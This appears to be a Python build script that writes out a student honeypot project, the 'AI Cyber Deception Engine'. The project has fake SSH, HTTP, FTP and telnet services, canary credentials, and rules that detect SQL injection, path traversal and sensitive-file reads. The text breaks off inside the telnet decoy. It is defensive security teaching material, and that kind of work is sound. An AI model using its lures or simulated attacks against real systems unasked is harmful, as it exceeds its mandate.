#!/usr/bin/env python3
"""
build_project.py -- AI Cyber Deception Engine (Desktop Web App edition)
Builds the ENTIRE project (40 files), then verifies every .py compiles.

Usage (from the folder where you saved this file):
    python build_project.py --here
"""

import argparse
import os
import py_compile
import sys

FILES = [

("README.md", r'''# AI Cyber Deception Engine (Desktop App)

Defensive-security class project: fake services (decoys) + canary tokens lure
attackers, an AI (Random Forest) classifies every interaction, and a desktop
dashboard shows alerts in real time.

## Run (one click)
    python desktop_app.py        # or press Run in VS Code on this file
A desktop window opens. Click "SIMULATE ATTACK" to launch the safe demo.

## Terminal mode (optional)
    python main.py train
    python main.py start         # then open http://127.0.0.1:5000
    python main.py demo          # second terminal

Educational use only. All decoys are simulated; auto-blocking is demo-only.
'''),

("requirements.txt", r'''flask>=2.2
paramiko>=2.11
scikit-learn>=1.1
numpy>=1.23
pyyaml>=6.0
joblib>=1.2
requests>=2.28
pywebview>=4.0
'''),

(".gitignore", r'''__pycache__/
*.pyc
data/
models/
logs/
deployed_tokens/
.venv/
'''),

("Dockerfile", r'''FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 2222 8080 2121 2323 33060 5000
CMD ["python", "desktop_app.py"]
'''),

("conftest.py", r'''import os
import sys

sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
'''),

("main.py", r'''#!/usr/bin/env python3
"""AI Cyber Deception Engine - terminal entry point.

Commands:
  python main.py train          Train the AI threat classification model
  python main.py start          Start decoys + analysis engine + dashboard
  python main.py demo           Run a safe simulated attack against the decoys
  python main.py deploy-tokens  Plant canary token files
"""

import argparse
import threading
import time

import yaml

from ai.train import train_model
from dashboard.app import run_dashboard
from engine.orchestrator import Orchestrator
from simulate.attack_simulator import run_all
from tokens.canary_manager import CanaryManager


def load_config(path="config/config.yaml"):
    with open(path, "r", encoding="utf-8") as fh:
        return yaml.safe_load(fh)


def cmd_start(args, config):
    orch = Orchestrator(config)
    orch.start()

    dash_cfg = config.get("dashboard", {})
    if dash_cfg.get("enabled", True) and not args.no_dashboard:
        threading.Thread(target=run_dashboard, args=(config,),
                         daemon=True, name="dashboard").start()
        print(f"[*] Dashboard : http://{dash_cfg.get('host', '127.0.0.1')}:"
              f"{dash_cfg.get('port', 5000)}")
    print("[*] Engine running. In another terminal run: python main.py demo")
    print("[*] Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Shutting down ...")
        orch.stop()


def cmd_train(args, config):
    train_model(config, n_samples=args.samples)


def cmd_demo(args, config):
    ports = {name: cfg["port"] for name, cfg in config["decoys"].items()
             if cfg.get("enabled")}
    run_all(args.target, ports)


def cmd_tokens(args, config):
    canary = CanaryManager(config)
    canary.deploy()
    print(f"[+] Canary token files written to '{canary.deploy_dir}/'")


def main():
    parser = argparse.ArgumentParser(
        prog="deception-engine",
        description="AI Cyber Deception Engine (educational, defensive tool)")
    parser.add_argument("--config", default="config/config.yaml")
    sub = parser.add_subparsers(dest="command", required=True)

    p_start = sub.add_parser("start", help="Start decoys, AI analysis, dashboard")
    p_start.add_argument("--no-dashboard", action="store_true")

    p_train = sub.add_parser("train", help="Train the ML threat model")
    p_train.add_argument("--samples", type=int, default=6000)

    p_demo = sub.add_parser("demo", help="Run safe simulated attack campaign")
    p_demo.add_argument("--target", default="127.0.0.1")

    sub.add_parser("deploy-tokens", help="Plant canary token files")

    args = parser.parse_args()
    config = load_config(args.config)
    {"start": cmd_start, "train": cmd_train, "demo": cmd_demo,
     "deploy-tokens": cmd_tokens}[args.command](args, config)


if __name__ == "__main__":
    main()
'''),

("desktop_app.py", r'''#!/usr/bin/env python3
"""One-click DESKTOP app for the AI Cyber Deception Engine.

Starts the engine (decoys + AI + canary tokens), the dashboard, and opens
everything in a native desktop window. The dashboard has a built-in
SIMULATE ATTACK button - no second terminal needed.

Run:  python desktop_app.py   (or press the Run button in VS Code)
"""

import os
import socket
import threading
import time
import webbrowser

import yaml

os.chdir(os.path.dirname(os.path.abspath(__file__)))

from dashboard.app import create_app
from engine.orchestrator import Orchestrator

try:
    import webview
    HAVE_WEBVIEW = True
except ImportError:
    HAVE_WEBVIEW = False


def _free_port(preferred):
    """Return the preferred port if free, else the next free port."""
    port = int(preferred)
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("127.0.0.1", port))
                return port
            except OSError:
                print(f"[!] Port {port} busy (old engine still running?) "
                      f"- using {port + 1}")
                port += 1


def main():
    with open("config/config.yaml", encoding="utf-8") as fh:
        config = yaml.safe_load(fh)

    model_path = config.get("model", {}).get("path", "models/threat_model.joblib")
    if not os.path.exists(model_path):
        print("[*] No trained model found - training now (first run only) ...")
        from ai.train import train_model
        train_model(config)

    print("[*] Starting engine: decoys + AI analysis + canary tokens ...")
    orch = Orchestrator(config)
    orch.start()

    port = _free_port(config.get("dashboard", {}).get("port", 5000))
    url = f"http://127.0.0.1:{port}"

    app = create_app(config.get("database", {}).get("path", "data/deception.db"),
                     config=config)
    threading.Thread(target=app.run,
                     kwargs=dict(host="127.0.0.1", port=port, threaded=True,
                                 use_reloader=False),
                     daemon=True, name="dashboard").start()
    time.sleep(1.5)

    if HAVE_WEBVIEW:
        print("[*] Opening desktop window ...")
        webview.create_window("AI Cyber Deception Engine", url,
                              width=1280, height=820, min_size=(900, 600))
        try:
            webview.start()
        except Exception as exc:
            print(f"[!] Native window failed ({exc}) - opening browser instead")
            webbrowser.open(url)
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
    else:
        print("[!] pywebview not installed - opening browser instead")
        print("    (install with:  pip install pywebview)")
        webbrowser.open(url)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    print("[*] Window closed - engine shut down. Goodbye!")


if __name__ == "__main__":
    main()
'''),

("config/config.yaml", r'''engine:
  host: "0.0.0.0"
  event_queue_timeout: 1.0
  alert_severity_threshold: 3
  auto_block_severity: 5
  brute_force_window_seconds: 60
  brute_force_threshold: 3
  health_check_interval: 45

database:
  path: "data/deception.db"

model:
  path: "models/threat_model.joblib"
  report_path: "models/training_report.txt"

decoys:
  ssh:
    enabled: true
    port: 2222
    banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"
    hostname: "prod-web-01"
  http:
    enabled: true
    port: 8080
  ftp:
    enabled: true
    port: 2121
  telnet:
    enabled: true
    port: 2323
  mysql:
    enabled: true
    port: 33060

canary_tokens:
  deploy_dir: "deployed_tokens"
  usernames: ["svc_backup", "db_admin", "keypack"]
  passwords: ["B4ckup#2023!x", "Pr0dSQL!key77", "keypack-9f2c-44de"]

dashboard:
  enabled: true
  host: "127.0.0.1"
  port: 5000

notifier:
  console: true
  log_file: "logs/alerts.log"
  webhook_url: ""
'''),

("engine/__init__.py", ""),

("engine/event_bus.py", r'''"""Thread-safe publish/consume queue connecting decoys to the engine."""

import queue


class EventBus:
    def __init__(self):
        self._q = queue.Queue()

    def publish(self, event):
        self._q.put(event)

    def consume(self, timeout=1.0):
        try:
            return self._q.get(timeout=timeout)
        except queue.Empty:
            return None

    def depth(self):
        return self._q.qsize()
'''),

("engine/database.py", r'''"""Thread-safe SQLite storage for events, alerts and the blocklist."""

import json
import os
import sqlite3
import threading

EVENT_COLS = ["id", "timestamp", "source_ip", "source_port",
              "decoy", "event_type", "data", "raw"]
ALERT_COLS = ["id", "timestamp", "event_id", "source_ip", "decoy",
              "severity", "label", "reason", "score", "blocked"]


class Database:
    def __init__(self, path="data/deception.db"):
        directory = os.path.dirname(path)
        if directory:
            os.makedirs(directory, exist_ok=True)
        self.path = path
        self._lock = threading.Lock()
        self._init_schema()

    def _connect(self):
        return sqlite3.connect(self.path, timeout=10)

    def _init_schema(self):
        with self._lock:
            conn = self._connect()
            conn.executescript(
                """
                CREATE TABLE IF NOT EXISTS events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    source_ip TEXT,
                    source_port INTEGER,
                    decoy TEXT,
                    event_type TEXT,
                    data TEXT,
                    raw TEXT
                );
                CREATE TABLE IF NOT EXISTS alerts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    event_id INTEGER,
                    source_ip TEXT,
                    decoy TEXT,
                    severity INTEGER,
                    label TEXT,
                    reason TEXT,
                    score REAL,
                    blocked INTEGER DEFAULT 0
                );
                CREATE TABLE IF NOT EXISTS blocklist (
                    ip TEXT PRIMARY KEY,
                    reason TEXT,
                    timestamp TEXT
                );
                """
            )
            conn.commit()
            conn.close()

    def insert_event(self, event):
        with self._lock:
            conn = self._connect()
            cur = conn.execute(
                "INSERT INTO events (timestamp, source_ip, source_port, decoy, "
                "event_type, data, raw) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (event.get("timestamp"), event.get("source_ip"),
                 int(event.get("source_port") or 0), event.get("decoy"),
                 event.get("event_type"),
                 json.dumps(event.get("data") or {}), event.get("raw", "")),
            )
            conn.commit()
            row_id = cur.lastrowid
            conn.close()
            return row_id

    def insert_alert(self, alert):
        with self._lock:
            conn = self._connect()
            cur = conn.execute(
                "INSERT INTO alerts (timestamp, event_id, source_ip, decoy, "
                "severity, label, reason, score, blocked) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (alert.get("timestamp"), alert.get("event_id"),
                 alert.get("source_ip"), alert.get("decoy"),
                 alert.get("severity"), alert.get("label"),
                 alert.get("reason"), alert.get("score", 0.0),
                 int(alert.get("blocked", 0))),
            )
            conn.commit()
            row_id = cur.lastrowid
            conn.close()
            return row_id

    def add_block(self, ip, reason):
        with self._lock:
            conn = self._connect()
            conn.execute(
                "INSERT OR REPLACE INTO blocklist (ip, reason, timestamp) "
                "VALUES (?, ?, datetime('now'))",
                (ip, reason),
            )
            conn.commit()
            conn.close()

    def get_events(self, limit=100):
        with self._lock:
            conn = self._connect()
            rows = conn.execute(
                "SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
            conn.close()
        out = []
        for r in rows:
            d = dict(zip(EVENT_COLS, r))
            d["data"] = json.loads(d["data"] or "{}")
            out.append(d)
        return out

    def get_alerts(self, limit=100):
        with self._lock:
            conn = self._connect()
            rows = conn.execute(
                "SELECT * FROM alerts ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
            conn.close()
        return [dict(zip(ALERT_COLS, r)) for r in rows]

    def get_blocklist(self):
        with self._lock:
            conn = self._connect()
            rows = conn.execute(
                "SELECT ip, reason, timestamp FROM blocklist ORDER BY timestamp DESC"
            ).fetchall()
            conn.close()
        return [{"ip": r[0], "reason": r[1], "timestamp": r[2]} for r in rows]

    def get_stats(self):
        with self._lock:
            conn = self._connect()
            stats = {
                "total_events": conn.execute("SELECT COUNT(*) FROM events").fetchone()[0],
                "total_alerts": conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0],
                "critical_alerts": conn.execute(
                    "SELECT COUNT(*) FROM alerts WHERE severity >= 4").fetchone()[0],
                "blocked_ips": conn.execute("SELECT COUNT(*) FROM blocklist").fetchone()[0],
                "alerts_by_severity": dict(conn.execute(
                    "SELECT severity, COUNT(*) FROM alerts GROUP BY severity").fetchall()),
                "events_by_decoy": dict(conn.execute(
                    "SELECT decoy, COUNT(*) FROM events GROUP BY decoy").fetchall()),
                "top_sources": [
                    {"ip": r[0], "count": r[1]} for r in conn.execute(
                        "SELECT source_ip, COUNT(*) FROM events "
                        "GROUP BY source_ip ORDER BY COUNT(*) DESC LIMIT 5")],
            }
            conn.close()
            return stats
'''),

("engine/rules.py", r'''"""Deterministic rules engine: canary use, SQLi, traversal, brute signals."""

from ai.feature_extractor import (SQLI_PATTERNS, TRAVERSAL_PATTERNS,
                                  INTERESTING_CMDS, COMMON_USERNAMES,
                                  payload_text)

AUTH_EVENTS = ("http_request", "http_login", "auth_attempt")


def evaluate_rules(event, canaries=None):
    """Return a verdict dict, or None when no rule fires."""
    data = event.get("data") or {}
    text = payload_text(event)

    if data.get("canary") or (
        canaries and data.get("username") and
        canaries.is_canary_credential(data.get("username", ""),
                                      data.get("password", ""))
    ):
        return {"label": "malicious", "severity": 5, "score": 1.0,
                "reason": "Canary credential used - confirmed unauthorized activity"}

    if data.get("username") and canaries and canaries.is_canary_username(data["username"]):
        return {"label": "malicious", "severity": 5, "score": 1.0,
                "reason": "Canary username attempted on decoy"}

    if data.get("canary_file"):
        return {"label": "malicious", "severity": 4, "score": 1.0,
                "reason": "Canary decoy file accessed - attacker looting fake secrets"}

    if any(p in text for p in SQLI_PATTERNS) and event.get("event_type") in AUTH_EVENTS:
        return {"label": "malicious", "severity": 4, "score": 1.0,
                "reason": "SQL injection pattern detected in request"}

    if any(p in text for p in TRAVERSAL_PATTERNS):
        return {"label": "malicious", "severity": 4, "score": 1.0,
                "reason": "Path traversal / sensitive file access attempt"}

    if event.get("event_type") == "command" and any(c in text for c in INTERESTING_CMDS):
        return {"label": "malicious", "severity": 4, "score": 1.0,
                "reason": "Suspicious command executed on decoy host"}

    if event.get("event_type") == "auth_attempt" and \
            str(data.get("username", "")).lower() in COMMON_USERNAMES:
        return {"label": "suspicious", "severity": 2, "score": 1.0,
                "reason": "Authentication attempt with default/common username"}

    return None
'''),

("engine/orchestrator.py", r'''"""Orchestrator: decoys -> event bus -> rules + ML + brute-force -> alerts."""

import logging
import threading
import time
from collections import defaultdict, deque
from datetime import datetime, timezone

from ai.feature_extractor import extract_features, vectorize
from ai.model import ThreatClassifier
from alerts.alert_manager import AlertManager
from decoys import build_decoys
from engine.database import Database
from engine.event_bus import EventBus
from engine.rules import evaluate_rules
from tokens.canary_manager import CanaryManager

ML_SEVERITY = {"benign": 1, "suspicious": 2, "malicious": 3}
LABEL_PRIORITY = {"malicious": 3, "suspicious": 2, "benign": 1}


class Orchestrator:
    def __init__(self, config):
        self.config = config
        self.db = Database(config.get("database", {}).get("path", "data/deception.db"))
        self.bus = EventBus()
        self.canaries = CanaryManager(config)
        self.alert_manager = AlertManager(self.db, config)
        self.model = ThreatClassifier.load(
            config.get("model", {}).get("path", "models/threat_model.joblib"))
        self.decoys = build_decoys(config, self.bus, self.canaries)

        engine_cfg = config.get("engine", {})
        self.threshold = engine_cfg.get("alert_severity_threshold", 3)
        self.bf_window = engine_cfg.get("brute_force_window_seconds", 60)
        self.bf_threshold = engine_cfg.get("brute_force_threshold", 3)
        self.health_interval = engine_cfg.get("health_check_interval", 45)

        self.auth_failures = defaultdict(deque)
        self._stop = threading.Event()
        self._worker = None
        self._health = None

    def start(self):
        self.canaries.deploy()
        for d in self.decoys:
            d.start()
        self._worker = threading.Thread(target=self._worker_loop,
                                        daemon=True, name="engine-worker")
        self._worker.start()
        if self.health_interval > 0:
            self._health = threading.Thread(target=self._health_loop,
                                            daemon=True, name="health-check")
            self._health.start()
        self._print_banner()

    def stop(self):
        self._stop.set()
        for d in self.decoys:
            d.stop()

    def _print_banner(self):
        print("=" * 62)
        print("  AI CYBER DECEPTION ENGINE - ONLINE")
        print("=" * 62)
        for d in self.decoys:
            print(f"  [decoy ] {d.DECOY_NAME.upper():<7} listening on {d.host}:{d.port}")
        state = "RandomForest model loaded" if (self.model and self.model.model) \
            else "NO MODEL - rules only (run: python main.py train)"
        print(f"  [model ] {state}")
        print(f"  [canary] token files planted in '{self.canaries.deploy_dir}/'")
        print("=" * 62)

    def _worker_loop(self):
        timeout = self.config.get("engine", {}).get("event_queue_timeout", 1.0)
        while not self._stop.is_set():
            event = self.bus.consume(timeout)
            if event is None:
                continue
            try:
                self._process(event)
            except Exception:
                logging.exception("event processing failed")

    def _health_loop(self):
        while not self._stop.is_set():
            for d in self.decoys:
                self.bus.publish({
                    "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                    "source_ip": "127.0.0.1", "source_port": 0,
                    "decoy": d.DECOY_NAME, "event_type": "connection",
                    "data": {"note": "internal health check"}, "raw": "",
                })
            end = time.time() + self.health_interval
            while not self._stop.is_set() and time.time() < end:
                time.sleep(0.5)

    def _process(self, event):
        event_id = self.db.insert_event(event)
        verdict = self._verdict(event)
        if verdict["severity"] >= self.threshold:
            self.alert_manager.raise_alert(event, event_id, verdict)

    def _ml(self, event):
        if self.model is None or self.model.model is None:
            return "unknown", 0.0
        vec = vectorize(extract_features(event))
        label, conf = self.model.predict([vec])[0]
        return label, conf

    def _brute_force_check(self, event):
        if event.get("event_type") != "auth_attempt":
            return None
        ip, now = event["source_ip"], time.time()
        dq = self.auth_failures[ip]
        dq.append(now)
        while dq and now - dq[0] > self.bf_window:
            dq.popleft()
        if len(dq) >= self.bf_threshold:
            return {"label": "suspicious", "severity": 3, "score": 1.0,
                    "reason": f"Brute-force pattern: {len(dq)} auth attempts "
                              f"in {self.bf_window}s"}
        return None

    def _verdict(self, event):
        candidates = []

        rule = evaluate_rules(event, self.canaries)
        if rule:
            candidates.append(rule)

        brute = self._brute_force_check(event)
        if brute:
            candidates.append(brute)

        label, conf = self._ml(event)
        if label != "unknown":
            candidates.append({"label": label, "severity": ML_SEVERITY[label],
                               "score": conf,
                               "reason": f"ML model classified event as {label} "
                                         f"(confidence {conf:.0%})"})

        if not candidates:
            return {"label": "benign", "severity": 1,
                    "reason": "No indicators of compromise", "score": 0.0}

        top = max(candidates, key=lambda c: LABEL_PRIORITY.get(c["label"], 0))
        severity = max(c.get("severity", 1) for c in candidates)
        reasons = []
        for c in sorted(candidates, key=lambda c: -c.get("severity", 0)):
            if c["reason"] not in reasons:
                reasons.append(c["reason"])
        return {"label": top["label"], "severity": severity,
                "reason": " | ".join(reasons), "score": top.get("score", 0.0)}
'''),

("decoys/__init__.py", r'''from decoys.ssh_decoy import SSHDecoy
from decoys.http_decoy import HTTPDecoy
from decoys.ftp_decoy import FTPDecoy
from decoys.telnet_decoy import TelnetDecoy
from decoys.mysql_decoy import MySQLDecoy

DECOY_REGISTRY = {"ssh": SSHDecoy, "http": HTTPDecoy, "ftp": FTPDecoy,
                  "telnet": TelnetDecoy, "mysql": MySQLDecoy}


def build_decoys(config, event_bus, canaries=None):
    host = config.get("engine", {}).get("host", "0.0.0.0")
    decoys = []
    for name, cfg in config.get("decoys", {}).items():
        cls = DECOY_REGISTRY.get(name)
        if cls is None or not cfg.get("enabled", True):
            continue
        needs_canaries = name in ("ssh", "telnet", "http")
        kwargs = {"canaries": canaries} if needs_canaries else {}
        decoys.append(cls(host, cfg.get("port"), event_bus, cfg, **kwargs))
    return decoys
'''),

("decoys/base_decoy.py", r'''"""Base class for all decoy services: TCP server + event emission."""

import logging
import socket
import threading
from datetime import datetime, timezone


class BaseDecoy(threading.Thread):
    DECOY_NAME = "base"

    def __init__(self, host, port, event_bus, config=None, canaries=None):
        super().__init__(daemon=True, name=f"decoy-{self.DECOY_NAME}")
        self.host = host
        self.port = int(port)
        self.event_bus = event_bus
        self.config = config or {}
        self.canaries = canaries
        self.logger = logging.getLogger(f"decoy.{self.DECOY_NAME}")
        self._stop_event = threading.Event()

    def emit(self, addr, event_type, data=None, raw=""):
        try:
            self.event_bus.publish({
                "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "source_ip": addr[0] if addr else "unknown",
                "source_port": int(addr[1]) if addr and len(addr) > 1 else 0,
                "decoy": self.DECOY_NAME,
                "event_type": event_type,
                "data": data or {},
                "raw": str(raw)[:2000],
            })
        except Exception:
            self.logger.exception("failed to publish event")

    def run(self):
        self._serve_tcp(self._handle)

    def _handle(self, conn, addr):
        raise NotImplementedError

    def stop(self):
        self._stop_event.set()

    def _serve_tcp(self, handler):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.host, self.port))
            sock.listen(16)
            self.logger.info("%s decoy listening on %s:%d",
                             self.DECOY_NAME, self.host, self.port)
            sock.settimeout(1.0)
            while not self._stop_event.is_set():
                try:
                    conn, addr = sock.accept()
                except socket.timeout:
                    continue
                threading.Thread(target=self._safe, args=(handler, conn, addr),
                                 daemon=True).start()
        except OSError as exc:
            self.logger.error("could not bind %s:%d (%s)", self.host, self.port, exc)
        finally:
            sock.close()

    def _safe(self, handler, conn, addr):
        try:
            handler(conn, addr)
        except Exception as exc:
            self.logger.debug("handler error: %s", exc)
        finally:
            try:
                conn.close()
            except OSError:
                pass
'''),

("decoys/ssh_decoy.py", r'''"""Low-interaction SSH decoy.

With paramiko: password logins all fail EXCEPT canary credentials, which
'succeed' and drop the attacker into a fake shell that logs every command.
Without paramiko: banner-grab honeypot only.
"""

import time

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

from decoys.base_decoy import BaseDecoy


class SSHDecoy(BaseDecoy):
    DECOY_NAME = "ssh"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.hostname = self.config.get("hostname", "prod-web-01")
        if HAVE_PARAMIKO:
            self.host_key = paramiko.RSAKey.generate(2048)
        else:
            self.host_key = None
            self.logger.warning("paramiko missing - SSH decoy in banner-only mode")

    def run(self):
        self._serve_tcp(self._handle_ssh if HAVE_PARAMIKO else self._handle_banner_only)

    def _handle_banner_only(self, conn, addr):
        try:
            conn.sendall((self.config.get("banner", "SSH-2.0-OpenSSH_8.2p1")
                          + "\r\n").encode())
            conn.settimeout(15)
            data = conn.recv(512)
            if data:
                snippet = data[:120].decode("utf-8", errors="ignore")
                self.emit(addr, "banner_grab", {"client_banner": snippet}, raw=snippet)
        except OSError:
            pass

    def _handle_ssh(self, sock, addr):
        try:
            transport = paramiko.Transport(sock)
            transport.local_version = self.config.get("banner", "SSH-2.0-OpenSSH_8.2p1")
            transport.add_server_key(self.host_key)
            server = self._HoneyServer(self, addr)
            transport.start_server(server=server)
            chan = transport.accept(timeout=60)
            if chan is None:
                transport.close()
                return
            time.sleep(0.7)
            if server.exec_command:
                chan.send(self._canned_response(server.exec_command) + "\r\n")
            elif server.authenticated:
                self._fake_shell(chan, addr)
            transport.close()
        except Exception as exc:
            self.logger.debug("ssh session error: %s", exc)

    class _HoneyServer(paramiko.ServerInterface):
        def __init__(self, decoy, addr):
            self.decoy, self.addr = decoy, addr
            self.authenticated = False
            self.exec_command = None

        def get_allowed_auths(self, username):
            return "password"

        def check_auth_password(self, username, password):
            canary = bool(self.decoy.canaries and
                          self.decoy.canaries.is_canary_credential(username, password))
            self.decoy.emit(self.addr, "auth_attempt",
                            {"username": username, "password": password,
                             "canary": canary},
                            raw=f"ssh auth {username}:{password}")
            if canary:
                self.authenticated = True
                return paramiko.AUTH_SUCCESSFUL
            return paramiko.AUTH_FAILED

        def check_channel_request(self, kind, chanid):
            return paramiko.OPEN_SUCCEEDED

        def check_channel_pty_request(self, channel, term, width, height,
                                      pixelwidth, pixelheight, modes):
            return True

        def check_channel_shell_request(self, channel):
            return True

        def check_channel_exec_request(self, channel, command):
            self.exec_command = command.decode("utf-8", errors="ignore")
            self.decoy.emit(self.addr, "command", {"command": self.exec_command},
                            raw=self.exec_command)
            return True

    def _fake_shell(self, chan, addr):
        prompt = f"svc_backup@{self.hostname}:~$ "
        try:
            chan.send("Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-169-generic x86_64)"
                      "\r\n\r\nLast login: Mon Jun  3 09:14:22 2024 from 10.20.30.2\r\n")
            chan.send(prompt)
            buf, commands = "", 0
            while commands < 8 and not self._stop_event.is_set():
                data = chan.recv(1024)
                if not data:
                    break
                for ch in data.decode("utf-8", errors="ignore"):
                    if ch in ("\r", "\n"):
                        cmd, buf = buf.strip(), ""
                        chan.send("\r\n")
                        if cmd:
                            commands += 1
                            self.emit(addr, "command", {"command": cmd}, raw=cmd)
                            chan.send(self._canned_response(cmd) + "\r\n")
                        chan.send(prompt)
                        if cmd in ("exit", "logout"):
                            return
                    elif ch == "\x7f":
                        if buf:
                            buf = buf[:-1]
                            chan.send("\b \b")
                    elif ch >= " ":
                        buf += ch
                        chan.send(ch)
        except Exception as exc:
            self.logger.debug("shell error: %s", exc)

    def _canned_response(self, cmd):
        c = cmd.strip().lower()
        if c == "whoami":
            return "svc_backup"
        if c.startswith("uname"):
            return "Linux prod-web-01 5.4.0-169-generic #187-Ubuntu SMP x86_64 GNU/Linux"
        if c == "ls":
            return "app  backup  deploy  logs  notes.txt"
        if c.startswith("cat /etc/passwd"):
            return ("root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "svc_backup:x:1002:1002::/home/svc_backup:/bin/bash")
        if c.startswith("cat /etc/shadow"):
            return "cat: /etc/shadow: Permission denied"
        if c.startswith("cat "):
            return f"cat: {cmd[4:].strip()}: No such file or directory"
        if c.startswith("ifconfig") or c.startswith("ip a"):
            return "eth0: inet 10.20.30.15  netmask 255.255.255.0"
        if c in ("exit", "logout"):
            return "logout"
        return f"bash: {cmd}: command not found"
'''),

("decoys/http_decoy.py", r'''"""HTTP decoy: fake internal portal with admin login, fake .env and fake
passwords backup file (canary token files). Every request is logged."""

import logging

from flask import Flask, Response, request

from decoys.base_decoy import BaseDecoy

PAGE_HOME = ("<html><head><title>Acme Corp - Internal Portal</title></head><body>"
             "<h1>Acme Corp Internal Portal</h1><p>Authorized employees only.</p>"
             "<ul><li><a href='/admin'>Admin Console</a></li></ul></body></html>")

PAGE_ADMIN_LOGIN = ("<html><head><title>Admin Login</title></head><body>"
                    "<h2>Admin Console</h2>"
                    "<form method='POST' action='/admin'>"
                    "<input name='username' placeholder='Username'><br>"
                    "<input name='password' type='password' placeholder='Password'><br>"
                    "<button>Login</button></form></body></html>")

PAGE_ADMIN_FAIL = ("<html><body><h3>Login failed: invalid credentials</h3>"
                   "<a href='/admin'>Back</a></body></html>")

PAGE_404 = ("<html><head><title>404 Not Found</title></head><body>"
            "<center><h1>404 Not Found</h1><hr>nginx/1.18.0 (Ubuntu)</center>"
            "</body></html>")


class HTTPDecoy(BaseDecoy):
    DECOY_NAME = "http"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.app = self._build_app()

    def run(self):
        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        self.app.run(host=self.host, port=self.port, threaded=True,
                     use_reloader=False)

    def _addr(self):
        return (request.remote_addr or "unknown",
                request.environ.get("REMOTE_PORT", 0))

    def _emit_request(self, event_type, data=None):
        data = dict(data or {})
        data.setdefault("method", request.method)
        data.setdefault("path", request.path)
        data["user_agent"] = request.headers.get("User-Agent", "")
        raw = f"{request.method} {request.full_path} form={dict(request.form)}"
        self.emit(self._addr(), event_type, data, raw)

    def _build_app(self):
        app = Flask("http-decoy")

        @app.after_request
        def fake_server(resp):
            resp.headers["Server"] = "nginx/1.18.0 (Ubuntu)"
            return resp

        @app.route("/")
        def index():
            self._emit_request("http_request")
            return PAGE_HOME

        @app.route("/admin", methods=["GET", "POST"])
        def admin():
            if request.method == "POST":
                u = request.form.get("username", "")
                p = request.form.get("password", "")
                canary = bool(self.canaries and
                              self.canaries.is_canary_credential(u, p))
                self._emit_request("http_login",
                                   {"username": u, "password": p, "canary": canary})
                return PAGE_ADMIN_FAIL
            self._emit_request("http_request")
            return PAGE_ADMIN_LOGIN

        @app.route("/.env")
        def dotenv():
            content = self.canaries.env_file_content() if self.canaries else ""
            self._emit_request("http_request", {"canary_file": True})
            return Response(content, mimetype="text/plain")

        @app.route("/backup/passwords.txt")
        def passwords():
            content = self.canaries.password_file_content() if self.canaries else ""
            self._emit_request("http_request", {"canary_file": True})
            return Response(content, mimetype="text/plain")

        @app.route("/robots.txt")
        def robots():
            self._emit_request("http_request")
            return Response("User-agent: *\nDisallow: /admin\nDisallow: /backup\n",
                            mimetype="text/plain")

        @app.route("/<path:path>", methods=["GET", "POST"])
        def catch_all(path):
            self._emit_request("http_request", {"path": "/" + path})
            return PAGE_404, 404

        return app
'''),

("decoys/ftp_decoy.py", r'''"""Minimal FTP decoy: logs USER/PASS attempts, always replies 530."""

from decoys.base_decoy import BaseDecoy


class FTPDecoy(BaseDecoy):
    DECOY_NAME = "ftp"

    def _handle(self, conn, addr):
        conn.sendall(b"220 corp-files FTP service ready\r\n")
        conn.settimeout(60)
        fobj = conn.makefile("rb")
        last_user = ""
        while True:
            line = fobj.readline()
            if not line:
                break
            cmd = line.decode("utf-8", errors="ignore").strip()
            if not cmd:
                continue
            parts = cmd.split(" ", 1)
            verb = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""

            if verb == "USER":
                last_user = arg
                self.emit(addr, "auth_attempt", {"username": arg, "password": ""},
                          raw=cmd)
                conn.sendall(b"331 User name okay, need password\r\n")
            elif verb == "PASS":
                canary = bool(self.canaries and
                              self.canaries.is_canary_credential(last_user, arg))
                self.emit(addr, "auth_attempt",
                          {"username": last_user, "password": arg, "canary": canary},
                          raw=f"USER {last_user} / PASS {arg}")
                conn.sendall(b"530 Login incorrect.\r\n")
            elif verb == "SYST":
                conn.sendall(b"215 UNIX Type: L8\r\n")
            elif verb == "QUIT":
                conn.sendall(b"221 Goodbye.\r\n")
                break
            else:
                conn.sendall(b"502 Command not implemented.\r\n")
'''),

("decoys/telnet_decoy.py", r'''"""Telnet/IoT decoy: classic login prompt capturing credential stuffing."""

import socket

from decoys.base_decoy import BaseDecoy


class TelnetDecoy(BaseDecoy):
    DECOY_NAME = "telnet"

    def _handle(self, conn, addr):
        conn.sendall(b"Welcome to CorpRouter v2.4 (build 118)\r\n"
                     b"Unauthorized access is prohibited.\r\n\r\nlogin: ")
        user = self._read_line(conn) or ""
        conn.sendall(b"Password: ")
        pwd = self._read_line(conn) or ""
